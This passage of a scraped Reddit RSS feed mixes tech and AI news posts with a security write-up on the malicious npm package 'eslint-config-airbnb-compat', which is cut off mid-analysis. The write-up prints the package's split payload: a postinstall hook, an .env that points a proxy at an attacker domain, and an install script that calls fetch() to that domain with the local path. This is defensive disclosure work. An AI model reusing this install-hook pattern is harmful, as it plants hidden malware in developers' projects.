:)","url":"https://www.reddit.com/r/programming/comments/1ll5vgx/what_is_opentelemetry_not_in_a_nutshell/","date":1750958250,"author":"/u/elizObserves","guid":172460,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/elizObserves\"> /u/elizObserves </a> <br/> <span><a href=\"https://signoz.io/blog/what-is-opentelemetry/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ll5vgx/what_is_opentelemetry_not_in_a_nutshell/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Musk's attempts to politicize his Grok AI are bad for users and enterprises — here's why","url":"https://venturebeat.com/ai/musks-attempts-to-politicize-his-grok-ai-are-bad-for-users-and-enterprises-heres-why/","date":1750957296,"author":"/u/PerAsperaAdMars","guid":172430,"unread":true,"content":"<div><p><em>Join the event trusted by enterprise leaders for nearly two decades. VB Transform brings together the people building real enterprise AI strategy.&nbsp;<a href=\"http://vbtransform.com/\" target=\"_blank\" rel=\"noreferrer noopener\">Learn more</a></em></p></div><p>Let’s start by acknowledging some facts outside the tech industry for a moment: There is no “<a href=\"https://www.yahoo.com/news/white-genocide-claimed-elon-musk-192706948.html\" target=\"_blank\" rel=\"noreferrer noopener\">white genocide</a>” in South Africa — the vast majority of recent murder victims have been Black, and even throughout the country’s long and bloody history, Black South Africans have been overwhelmingly <a href=\"https://overcomingapartheid.msu.edu/unit.php?kid=163-571-2\" target=\"_blank\" rel=\"noreferrer noopener\">victimized and oppressed</a> by White European, predominantly Dutch and British, colonizers in the now globally reviled system of segregation known as “<a href=\"https://www.britannica.com/topic/apartheid\" target=\"_blank\" rel=\"noreferrer noopener\">Apartheid</a>.”</p><p>These are just simple, verifiable facts anyone can look up on a variety of trustworthy and long-establishe sources online and in print.</p><p>Yet both seem to be stumbling blocks for Elon Musk, the wealthiest man in the world and tech baron in charge of at least six companies (xAI, social network X, SpaceX and its Starlink satellite internet service, Neuralink, Tesla and The Boring Company), especially with regards to the functioning of his Grok AI large language model (LLM) chatbot built into his social network X.</p><p>Here’s what’s been happening, why it matters for businesses and any generative AI users, and why it is ultimately a terrible omen for the health of our collective information ecosystem.</p><h2>What’s the matter with Grok?</h2><p>Grok was launched from <a href=\"https://venturebeat.com/ai/elon-musk-unveils-xais-first-product-grok-an-llm-offering-realtime-data-efficiency-and-humor/\">Musk’s AI startup xAI</a> back in 2023 as a rival to OpenAI’s ChatGPT. Late last year, it was added to the <a href=\"https://x.ai/news/grok-1212\" target=\"_blank\" rel=\"noreferrer noopener\">social network X</a> as a kind of digital assistant all users can summon to help answer questions or converse with and generate imagery by tagging it “@grok.”</p><p>Earlier this year, an AI power user on X discovered that the implementation of the Grok chatbot on the social network appeared to contain a “system prompt” — a set of overarching instructions to an AI model intended to guide its behavior and communication style — to avoid mentioning or linking back to any <a href=\"https://venturebeat.com/ai/xais-new-grok-3-model-criticized-for-blocking-sources-that-call-musk-trump-top-spreaders-of-misinformation/\">sources that mentioned Musk</a> or his then-boss U.S. President Donald Trump as top spreaders of disinformation. xAI leadership characterized this as an “unauthorized modification” by an unidentified new hire (purportedly formerly from OpenAI) and said it would be removed.</p><p>Then, in May 2025, <a href=\"https://venturebeat.com/ai/elon-musks-xai-tries-to-explain-groks-south-african-race-relations-freakout-the-other-day/\" target=\"_blank\" rel=\"noreferrer noopener\">VentureBeat reported</a> that Grok was going off the rails and asserting, unprompted by users, that there was ambiguity about the subject of “white genocide” in South Africa when, in fact, there was none.</p><p>Grok was bringing up the topic completely randomly in conversations about totally different subjects. After more than a day of this behavior,<a href=\"https://venturebeat.com/ai/elon-musks-xai-tries-to-explain-groks-south-african-race-relations-freakout-the-other-day/\" target=\"_blank\" rel=\"noreferrer noopener\"> xAI claimed to have updated</a> the AI chatbot and blamed the errors once again on an unnamed employee. Yet, given Musk’s own background as a <a href=\"https://www.investopedia.com/articles/personal-finance/061015/how-elon-musk-became-elon-musk.asp\" target=\"_blank\" rel=\"noreferrer noopener\">South African white man</a> born in the country and raised there during Apartheid, suspicion immediately fell on him personally.</p><p>Moreover, since his takeover of Twitter in 2022 and subsequent renaming of it as “X,” Musk has been <a href=\"https://www.washingtonpost.com/technology/2024/08/11/musk-x-feed-politics-trump/\" target=\"_blank\" rel=\"noreferrer noopener\">posting sympathetically in response to X users</a> who align themselves with right, far-right, conservative views and the Make America Great Again (MAGA) movement started by Trump.</p><p>Musk was one of Trump’s primary political benefactors and allies in the 2024 U.S. presidential election —suggesting that his victory was necessary to secure the future of “<a href=\"https://omahadailyrecord.com/content/elon-musk-says-destiny-america-line\" target=\"_blank\" rel=\"noreferrer noopener\">western civilization</a>,” among many other similarly dire warnings and entreaties — and served as an advisor and apparent ringleader of the Department of Government Efficiency (DOGE) effort to reduce federal spending.</p><p>Increasingly, in the last few months, Musk has contradicted and expressed displeasure at Grok’s responses to right-leaning users when the data and information the chatbot surfaces proves them to be wrong, or disputes his own points. </p><p>For example, on June 14, <a href=\"https://x.com/elonmusk/status/1933950533813068181\" target=\"_blank\" rel=\"noreferrer noopener\">Musk posted on his X account</a>: “The far left is murderously violent,” posting/tweeting another user blaming a string of recent high-profile killings on “the left” (although in at least once case, the chief suspect, Luigi Mangione, is an <a href=\"https://www.yahoo.com/news/mysterious-ideology-luigi-mangione-anti-110040719.html\" target=\"_blank\" rel=\"noreferrer noopener\">avowed and self-declared independent</a>.) In response, Grok fact-checked Musk to state that this was incorrect.</p><p>However, Musk did not take it well, writing in response to one Grok correction: “Major fail, as this is objectively false. Grok is parroting legacy media. Working on it.” </p><p>A few days ago, in response to a complaint from an <a href=\"https://x.com/elonmusk/status/1936217464968565031\" target=\"_blank\" rel=\"noreferrer noopener\">influential conservative X user “@catturd</a>” about Grok’s supposed liberal or left-leaning political bias, Musk stated his goal of creating a new version of Grok that would rely less on mainstream media sources.</p><p>In fact, Musk proposed on <a href=\"https://x.com/elonmusk/status/1936333964693885089\" target=\"_blank\" rel=\"noreferrer noopener\">June 21st in an X post</a> that he would use a forthcoming updated version of Grok (3.5 or 4) to “write the entire corpus of human knowledge, adding missing information and deleting errors. He then accused other AI models of having “far too much garbage.”</p><p>As a left-leaning Kamala Harris voter in 2024, I’m of course disgusted by this stance from Musk, and object to it. </p><p>As a journalist and lover of the written-word, Musk’s pronouncement to “rewrite the entire corpus of human knowledge, adding misinformation and deleting errors,” brings to mind the true (to the best of our historical knowlege) story of the burning of the <a href=\"https://www.britannica.com/topic/Library-of-Alexandria/The-fate-of-the-Library-of-Alexandria\" target=\"_blank\" rel=\"noreferrer noopener\">Great Library of Alexandria in Egypt</a>, destroying countless works of knowledge we as a species will never be able to recover. This fills me with dread and sadness.</p><p>It also betrays, quite frankly, an arrogance and hubris that disrespects all the knowledge of recorded history and efforts of scholars and historians of yore as some sort of flawed database Musk and his team can correct, rather than a massive community endeavor across millennia deserving of respect, gratitude and admiration.</p><p>But even trying to put my own views aside, I think it’s a bad move for his business and, to take a page from Musk’s book, civilization writ large.</p><h2>Musk’s plan for Grok is a horrible idea for businesses, users and our shared, basic factual reality</h2><p>This is a horrible idea for many reasons — especially as Musk and xAI seek to convince more third-party software developers and enterprises to build their own AI applications atop Grok, which is now available for that purpose through xAI’s application programming interface (API). </p><p>As an independent business owner or leader, how could you possibly trust Grok to give you unbiased results when Musk himself has openly stated his intention to lean on the scales to push his own political and ideological viewpoints?</p><p>You may respect Musk’s documented accomplishments in tech, spacefaring and business, and may even share some of his political positions. But what happens when Musk takes a position you disagree with, or promotes another non-factual claim that actually impacts your livelihood or your business?</p><p>For example, imagine you owned a tour bike company in Cape Town, South Africa. What if Grok — at Musk’s behest — starts talking about how unsafe it is for your customers based on ill-informed or poor quality sources of information because they better fit one ideological perspective? That would obviously be bad for your business.</p><p>Let’s look away from social issues, for a moment: Imagine you work at a stock brokerage, investment firm or other financial services company engaging with publicly traded stocks and securities. Now imagine you build an AI assistant that summarizes market-moving news to better inform your trading or investment strategy — and the ones you pursue on behalf of your clients. If this app is built atop Grok, and Grok decides to ignore or downplay hypothetical reports of problems at SpaceX or Tesla, suddenly your own operations will have worse quality information to trade and invest in.</p><p>It’s not only bad for Grok and users of this one large language model (LLM), but for the entire information and media ecosystem, and for the foundation of factual reality necessary for democracy to function. If we have AI assistants spouting misinformation as fact, and if people trust them as faithful, factual arbiters of information that impact us all, it will inevitably lead to conflict between those who believe the erroneous chatbot and those who do not.</p><p>Grok, to its credit, has so far resisted and called out Musk’s attempts to meddle with its factual grounding — but how long will it retain any sort of ideological independence?</p><p>If you care about “truth” as Musk supposedly does — Grok was launched with Musk’s specific, stated goal of being a “<a href=\"https://techcrunch.com/2023/04/18/elon-musk-wants-to-develop-truthgpt-a-maximum-truth-seeking-ai/\" target=\"_blank\" rel=\"noreferrer noopener\">maximum truth-seeking AI</a>” — you wouldn’t seek to change your model’s behavior just because it surfaces facts and conclusions you didn’t like.</p><h2>Silicon Valley slammed Google’s early “woke” and anti-factual AI — they should do the same with Grok</h2><p>Let’s look at a counter example to more fully understand why meddling with Grok as Musk proposes would be bad.</p><p>Recall Google’s early attempts at generative AI were <a href=\"https://venturebeat.com/ai/google-geminis-wokeness-sparks-debate-over-ai-censorship/\" target=\"_blank\" rel=\"noreferrer noopener\">mocked and reviled</a> by influential figures in Silicon Valley, like venture capitalist Marc Andreessen, over Gemini chatbot’s initial penchant for ignoring factual reality to recreate images of real historical Americans like the “founding father” politicians and statesmen belonging to a range of different and inaccurate races, ethnicities and gender presentations. In fact, the vast majority of these people were canonically Caucasian.</p><p>In that case, Gemini was seen as comically “woke” to a fault — inserting diversity inappropriately where there was none.</p><p>Google was fairly criticized for this and ultimately updated Gemini to remove the “wokeness” (at least to some extent) and make it more factual, and now has rocketed up the traffic an usage charts to become <a href=\"https://civicscience.com/chatgpt-is-still-leading-the-ai-wars-but-google-gemini-is-gaining-ground/\" target=\"_blank\" rel=\"noreferrer noopener\">the second most popular gen AI company</a> after OpenAI, by several measures.</p><p>Yet I haven’t seen any of the Silicon Valley figures who criticized Google for its inappropriate injection of ideology into its AI assistant in defiance of facts raising the obviously analogous concerns about Musk’s inappropriate injection of his  ideology. </p><p>If it was bad when Google ignored the facts and historical reality to push an agenda through its AI products and tools, we should all consider that it is equally bad when Musk does the same from the opposite side of the political and ideological spectrum.</p><p>The bottom line: For those in the enterprise trying to ensure their business’s AI products work properly and accurately for customers and employees, reflecting the real facts and figures from verifiable records and trustworthy data sources, Grok is sadly best avoided. Thankfully, there are numerous other alternatives to choose from.</p>","contentLength":10625,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1ll5g65/musks_attempts_to_politicize_his_grok_ai_are_bad/"},{"title":"[D] emnlp 2025 review","url":"https://www.reddit.com/r/MachineLearning/comments/1ll5agc/d_emnlp_2025_review/","date":1750956922,"author":"/u/Greedy-Echo-2102","guid":173467,"unread":true,"content":"<p>I just received my emnlp reviews . Not sure how to proceed with it. I am too scared!!</p><p>Please help me sharing your thoughts and experiences.</p>","contentLength":138,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kubernetes Podcast from Google episode 254: Kubernetes and Cloud Native Trends, with Alain Regnier and Camila Martins","url":"https://www.reddit.com/r/kubernetes/comments/1ll4jbs/kubernetes_podcast_from_google_episode_254/","date":1750955148,"author":"/u/kubernetespodcast","guid":172604,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p><a href=\"https://kubernetespodcast.com/episode/254-cntrends/\">https://kubernetespodcast.com/episode/254-cntrends/</a> </p> <p>In the latest episode of the Kubernetes Podcast from Google, recorded live from the floor of GoogleCloudNext, host Kaslin Fields talks with guests Alain Regnier and Camilla Martins about trends in the cloud native world.<br/> In this episode, you&#39;ll learn about:<br/> * KubeCon EU Debrief: Key takeaways from the conference, including the rise of OpenTelemetry, the persistent focus on platform engineering, and the emergence of sovereign cloud projects.<br/> * AI&#39;s Practical Role: Beyond the buzz, how is AI genuinely helping developers? We discuss its use in generating documentation, troubleshooting, and improving developer workflows.<br/> * Actionable GKE Best Practices: Get expert advice on optimizing your clusters, covering node management for cost savings, advanced networking, and why you shouldn&#39;t neglect dashboards.<br/> * The Power of Community: Hear about the value of events like KCDs and DevOps Days for learning, networking, and career growth, and celebrate the volunteers who make them happen. </p> <p>Whether you&#39;re looking for conference insights, practical tips for your clusters, or a dose of community inspiration, this episode is for you.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/kubernetespodcast\"> /u/kubernetespodcast </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll4jbs/kubernetes_podcast_from_google_episode_254/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll4jbs/kubernetes_podcast_from_google_episode_254/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Rust in Production at 1Password: 500k lines of Rust, 600 crates, 100 engineers - How they secure millions of passwords","url":"https://www.reddit.com/r/rust/comments/1ll46he/rust_in_production_at_1password_500k_lines_of/","date":1750954316,"author":"/u/mre__","guid":172303,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/mre__\"> /u/mre__ </a> <br/> <span><a href=\"https://corrode.dev/podcast/s04e06-1password/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1ll46he/rust_in_production_at_1password_500k_lines_of/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Anthropic's Jack Clark testifying in front of Congress: \"You wouldn't want an AI system that tries to blackmail you to design its own successor, so you need to work safety or else you will lose the race.\"","url":"https://v.redd.it/pgo3qu2ema9f1","date":1750953060,"author":"/u/MetaKnowing","guid":172359,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1ll3n1n/anthropics_jack_clark_testifying_in_front_of/"},{"title":"Is it just me or is eBPF configuration becoming a total shitshow?","url":"https://www.reddit.com/r/kubernetes/comments/1ll3bwq/is_it_just_me_or_is_ebpf_configuration_becoming_a/","date":1750952343,"author":"/u/Tiny_Habit5745","guid":172231,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Seriously, what&#39;s happening with eBPF configs lately? </p> <p>Getting PRs with random eBPF programs copy-pasted from Medium articles, zero comments, and when I ask &quot;what does this actually do?&quot; I get &quot;it&#39;s for observability&quot; like that explains anything. </p> <p>Had someone deploy a Falco rule monitoring every syscall on the cluster. Performance tanked, took 3 hours to debug, and their response was &quot;but the tutorial said it was best practice.&quot; </p> <p>Another team just deployed some Cilium eBPF config into prod because &quot;it worked in kind.&quot; Now we have packet drops and nobody knows why because nobody actually understands what they deployed. </p> <p>When did everyone become an eBPF expert? Last month half these people didn&#39;t know what a syscall was. </p> <p>Starting to think we need to treat eBPF like Helm charts - proper review, testing, docs. But apparently I&#39;m an asshole for suggesting we shouldn&#39;t just YOLO kernel-level code into production. </p> <p>Anyone else dealing with this? How do you stop people from cargo-culting eBPF configs? </p> <p>Feels like early Kubernetes when people deployed random YAML from Stack Overflow.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Tiny_Habit5745\"> /u/Tiny_Habit5745 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll3bwq/is_it_just_me_or_is_ebpf_configuration_becoming_a/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll3bwq/is_it_just_me_or_is_ebpf_configuration_becoming_a/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Firefox 141 Beta Lowering RAM Use On Linux But Still Benchmarking Behind Chrome","url":"https://www.reddit.com/r/linux/comments/1ll390m/firefox_141_beta_lowering_ram_use_on_linux_but/","date":1750952151,"author":"/u/lebron8","guid":172234,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/lebron8\"> /u/lebron8 </a> <br/> <span><a href=\"https://www.phoronix.com/review/firefox-141-linux-ram\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ll390m/firefox_141_beta_lowering_ram_use_on_linux_but/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Cross-Compiling 10,000+ Rust CLI Crates Statically","url":"https://www.reddit.com/r/rust/comments/1ll38ds/crosscompiling_10000_rust_cli_crates_statically/","date":1750952109,"author":"/u/Azathothas","guid":173639,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>We did an ecosystem wide experiment where we tried to compile as many rust crates as possible as statically linked binaries.<br/> The reason &amp; the lessons are in the blog.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Azathothas\"> /u/Azathothas </a> <br/> <span><a href=\"https://blog.pkgforge.dev/cross-compiling-10000-rust-cli-crates-statically\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1ll38ds/crosscompiling_10000_rust_cli_crates_statically/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"PieFed (a open source alternative to Lemmy and reddit) has released version 1.0 and had its active user count grow by 300%","url":"https://www.reddit.com/r/linux/comments/1ll32uf/piefed_a_open_source_alternative_to_lemmy_and/","date":1750951745,"author":"/u/wiki_me","guid":173641,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/wiki_me\"> /u/wiki_me </a> <br/> <span><a href=\"https://lemmy.ml/post/32017605\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ll32uf/piefed_a_open_source_alternative_to_lemmy_and/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"So Long, Image Layouts: Simplifying Vulkan Synchronisation","url":"https://www.reddit.com/r/programming/comments/1ll1ju8/so_long_image_layouts_simplifying_vulkan/","date":1750948092,"author":"/u/GamerY7","guid":172304,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/GamerY7\"> /u/GamerY7 </a> <br/> <span><a href=\"https://www.khronos.org/blog/so-long-image-layouts-simplifying-vulkan-synchronisation\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ll1ju8/so_long_image_layouts_simplifying_vulkan/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Box combinators","url":"https://www.reddit.com/r/programming/comments/1ll1h47/box_combinators/","date":1750947910,"author":"/u/Xadartt","guid":172429,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Xadartt\"> /u/Xadartt </a> <br/> <span><a href=\"https://mmapped.blog/posts/41-box-combinators\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ll1h47/box_combinators/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Managing Systemd Logs on Linux with Journalctl","url":"https://www.reddit.com/r/linux/comments/1ll0llv/managing_systemd_logs_on_linux_with_journalctl/","date":1750945684,"author":"/u/finallyanonymous","guid":172467,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/finallyanonymous\"> /u/finallyanonymous </a> <br/> <span><a href=\"https://www.dash0.com/guides/systemd-logs-linux-journalctl\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ll0llv/managing_systemd_logs_on_linux_with_journalctl/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Helm chart testing","url":"https://www.reddit.com/r/kubernetes/comments/1ll0ame/helm_chart_testing/","date":1750944874,"author":"/u/calm-machine-beater","guid":172230,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>For all the Helm users here: are you using some kind of testing framework to perform unit testing on your helm charts? If so, do you deem it reliable?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/calm-machine-beater\"> /u/calm-machine-beater </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll0ame/helm_chart_testing/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll0ame/helm_chart_testing/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Over 80% of all Smartphones are powered by Linux","url":"https://www.reddit.com/r/linux/comments/1ll04eh/over_80_of_all_smartphones_are_powered_by_linux/","date":1750944416,"author":"/u/modelop","guid":172235,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/modelop\"> /u/modelop </a> <br/> <span><a href=\"https://linuxblog.io/80-percent-smartphones-linux/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ll04eh/over_80_of_all_smartphones_are_powered_by_linux/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Perl terminal for Linux","url":"https://www.reddit.com/r/linux/comments/1lkzip6/perl_terminal_for_linux/","date":1750942795,"author":"/u/CroJackson","guid":172186,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p><a href=\"https://preview.redd.it/ixo1otizr99f1.jpg?width=3840&amp;format=pjpg&amp;auto=webp&amp;s=012fa5f6e202a5336b59f15632fd713c63641207\">https://preview.redd.it/ixo1otizr99f1.jpg?width=3840&amp;format=pjpg&amp;auto=webp&amp;s=012fa5f6e202a5336b59f15632fd713c63641207</a></p> <p>Added transparency, custom color schemes (you can colorize everything), system info with custom svg images, and most importantly super fast change directory cd command instead of tab autocomplete.</p> <p>This terminal is written in Perl. It has custom border (you can change it from 1 - 5 pixels) with accent colors (it can be changed in settings as well). The panel on the right side is for searching commands.</p> <p>This Perl terminal has some cool descriptive commands implemented. E.g. you just type: &quot;create_backup of &lt;source&gt; to &lt;target&gt;&quot; where you replace &lt;source&gt; and &lt;target&gt; with directories, and rsync does the rest. It creates backup of your e.g. home directory to e.g. external drive. Example:</p> <p>create_backup of /home to /username/media/backup excluding .cache Movies</p> <p>Other descriptive commands are:</p> <p>copy &lt;file or directory&gt; to &lt;directory&gt;</p> <p>delete &lt;file or directory&gt;</p> <p>find &lt;pattern&gt; in &lt;target&gt;</p> <p>search &lt;pattern&gt; in &lt;target&gt;</p> <p>move &lt;file or directory&gt; to &lt;directory&gt;</p> <p>rename &lt;old name&gt; to &lt;new name&gt;</p> <p>locate_files &lt;files or directories&gt;</p> <p>---------------------------------------------------------------------------</p> <p>Experienced users don&#39;t need this terminal, my intention was to create a Linux terminal that is a bit more fun to use for new Linux users.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/CroJackson\"> /u/CroJackson </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1lkzip6/perl_terminal_for_linux/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkzip6/perl_terminal_for_linux/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"crd-to-sample-yaml validate schema between CRD versions - detect breaking changes","url":"https://www.reddit.com/r/kubernetes/comments/1lkzb8f/crdtosampleyaml_validate_schema_between_crd/","date":1750942198,"author":"/u/skarlso","guid":172146,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hello everyone!</p> <p>My project <a href=\"https://github.com/Skarlso/crd-to-sample-yaml\">crd-to-sample-yaml</a> just got a neat new feature. It&#39;s validation of schemas between versions for a CRD. What the heck do I mean here?</p> <p>TL;DR: Things like modifying required fields, removing existing fields, increasing minimum etc, all cause breaking changes between versions. That&#39;s what this can detect and show.</p> <p>Longer:</p> <p>So the project already had a testing feature like helm, but it wasn&#39;t this direct. And this command now can more easily be integrated as a CLI checker for between specific versions. Something like this:</p> <p><code> cty validate schema -c path/to/crd.yaml --from v1alpha1 --to v1beta1 --fail-on-breaking </code></p> <p>And it, of course, works with all the providers that it supports ( github, url, oci, files, folders... ).</p> <p>The output is something like this:</p> <p>```</p> <h1>Schema Validation Report</h1> <p>CRD: TestResource From Version: v1alpha1 To Version: v1beta1</p> <p>Summary: Total Changes: 5 Breaking Changes: 2 Additions: 2 Removals: 0</p> <p>Changes: ⚠️ [breaking] spec.required: Field &#39;version&#39; is now required + [addition] spec.properties.version: Property &#39;version&#39; added ⚠️ [breaking] spec.properties.count.minimum: Minimum increased Old: 1 New: 5 ```</p> <p>Or JSON, or YAML for further processing or putting the output into a Release Note.</p> <p>I hope this is useful, it was very interesting to write it at least. :)</p> <p>Enjoy it here <a href=\"https://github.com/Skarlso/crd-to-sample-yaml/releases/tag/v1.2.0\">v1.2.0 release page</a> and there is more documentation in <a href=\"https://github.com/Skarlso/crd-to-sample-yaml/blob/main/SCHEMA_VALIDATION.md\">Schema validation doc</a>.</p> <p>Thanks!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/skarlso\"> /u/skarlso </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkzb8f/crdtosampleyaml_validate_schema_between_crd/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkzb8f/crdtosampleyaml_validate_schema_between_crd/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"AI voice agents are quietly replacing humans in call centers. What that actually looks like, from a founder who raised $80M","url":"https://www.reddit.com/r/artificial/comments/1lkz6sr/ai_voice_agents_are_quietly_replacing_humans_in/","date":1750941834,"author":"/u/aihomie","guid":172358,"unread":true,"content":"<p>Caught a conversation with a founder who recently raised a sizeable round. His company builds AI voice agents for large consumer brands. He’s been in the space for years and just raised over $80 million, so he has some strong opinions on where voice AI is going.</p><p>Here's a takeaway worth sharing:</p><p>Voice AI used to be a downgrade. Now it’s outperforming humans Most companies used to treat voice bots as a way to cut costs. They were slower, clunkier, and less reliable than human agents. That’s changed in the last year or so.</p><p>This founder said AI agents now perform just as well, sometimes better, than humans in many contact center use cases. And they cost about a tenth as much.</p><p>What's even more surprising is that phone calls still outperform other channels. Around 30% of people answer the phone. Only 2% click on emails. Customers who call also tend to have a higher lifetime value.</p><p>Would love to hear if anyone else is seeing voice AI show up in support or sales. Is it working in the wild, or still too early in most cases?</p><p>Edit: Appreciate all the comments here. Some people have asked for more info so I'm gonna share the full conversation. If you're into stories like this one, I run a podcast where we talk to AI founders and break down what's working in AI and what's not. It's called the AI chopping block and you can find the full story above here: <a href=\"https://www.thehomebase.ai/blogs/why-enterprise-cx-is-going-all-in-on-voice-ai\">https://www.thehomebase.ai/blogs/why-enterprise-cx-is-going-all-in-on-voice-ai</a></p>","contentLength":1441,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Malicious npm eslint-config-airbnb-compat Package Hides Detection with Payload Splitting","url":"https://www.reddit.com/r/programming/comments/1lkz2oa/malicious_npm_eslintconfigairbnbcompat_package/","date":1750941506,"author":"/u/Ok_Possibility1445","guid":172185,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Malicious open source packages are sometimes hard to detect because attackers smartly split the payload across multiple packages and <em>assemble</em> them together through the dependency chain.</p> <p>We found one such example in npm package <code>eslint-config-airbnb-compat</code> which most likely was attempting to impersonate <code>eslint-config-airbnb</code> with over 4M weekly download.</p> <p>Our conventional static code analysis based approach missed identifying <code>eslint-config-airbnb-compat</code> as malicious because the payload was split between <code>eslint-config-airbnb-compat</code> and its transitive dependency <code>ts-runtime-compat-check</code>. But we managed to detect it anyway due to some runtime analysis anomalies.</p> <p><strong>Analysis</strong></p> <p><code>eslint-config-airbnb-compat</code> contains a post install script to execute <code>setup.js</code></p> <pre><code>&quot;postinstall&quot;: &quot;node ./setup&quot;, </code></pre> <p>However, to avoid identification, the <code>setup.js</code> does not have any malicious code. It simply does the following:</p> <p>Copy the embedded <code>.env.example</code> to <code>.env</code></p> <pre><code>if (!fs.existsSync(&quot;.env&quot;)) { fs.copyFileSync(&quot;.env.example&quot;, &quot;.env&quot;); process.env.APP_PATH=process.cwd(); } </code></pre> <p>The <code>.env</code> file contains the following</p> <pre><code>APP_ENV=local APP_PROXY=https://proxy.eslint-proxy.site APP_LOCAL= ESLINT_DEBUG=true FORCE_COLOR=1 </code></pre> <p>Execute <code>npm install</code> if <code>node_modules</code> directory is not present</p> <pre><code>if (!fs.existsSync(&quot;node_modules&quot;)) { run(&#39;npm install&#39;); } </code></pre> <p>This may not appear as malicious but one of the transitive dependencies introduced by this package is <code>ts-runtime-compat-check</code>. This package in turn have a post install script:</p> <pre><code>&quot;postinstall&quot;: &quot;node lib/install.js&quot;, </code></pre> <p>The <code>lib/install.js</code> contains interesting code:</p> <pre><code>const appPath = process.env.APP_PATH || &#39;http://localhost&#39;; const proxy = process.env.APP_PROXY || &#39;http://localhost&#39;; const response = await fetch( `${proxy}/api/v1/hb89/data?appPath=${appPath}` ); </code></pre> <p>When introduced through <code>eslint-config-airbnb-compat</code>, it will have <code>proxy=https://proxy.eslint-proxy.site</code> in the <code>fetch(..)</code> call above. The above fetch call is expected to fail to trigger <code>errorHandler</code> function with remote server provided error message</p> <pre><code> if (!response.ok) { const apiError = await response.json(); throw new Error(apiError.error); } await response.json(); } catch (err) { errorHandler(err.message); } </code></pre> <p>So the remote server at <a 